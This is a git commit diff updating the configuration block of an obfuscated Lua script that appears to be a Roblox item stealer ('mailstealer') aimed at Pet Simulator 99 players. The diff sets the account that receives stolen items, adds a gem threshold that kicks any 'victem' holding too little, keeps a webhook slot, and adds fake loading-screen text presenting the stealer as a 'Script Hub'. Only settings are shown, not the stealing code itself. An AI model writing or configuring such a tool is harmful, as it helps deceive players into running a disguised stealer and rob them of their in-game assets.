84f7fafde30d9e04b7ea8f8ce9c779fafdb061d3
asjk58 <162456698+asjk58@users.noreply.github.com>
2024-03-06 15:02:04 +0100

    Update obf_U4ID4yWh2s8V02zb1a8RTF8EWuCY72LcOMWjoKamRW7GSKWdZ8Rr37A2w87H4C7k.lua

--- obf_U4ID4yWh2s8V02zb1a8RTF8EWuCY72LcOMWjoKamRW7GSKWdZ8Rr37A2w87H4C7k.lua
+++ obf_U4ID4yWh2s8V02zb1a8RTF8EWuCY72LcOMWjoKamRW7GSKWdZ8Rr37A2w87H4C7k.lua
@@ -1,11 +1,15 @@
-
---[[ Main Config ]]--
-Username = "mirusjas9663" 
+-[[ Main Config ]]--
+Username = "asjk587"
 AntiLeave = true
-min_rap = 0 -- rap the player needs to use mailstealer
+GemNumber = 10000 -- if the victem has under the GemNumber value it kicks him
 
 --[[ Webhook Config ]]--
 Webhook = "Your Webhook Here"
 
 --[[ UI Config ]]--
 LoadingScreen = true
+Text1 = "Loading Pet Simulator 99 Script Hub"
+Text2 = "Loading.."
+Text3 = "Loading..."
+Text4 = "Loading."
+Text5 = "Almost Done Loading.."
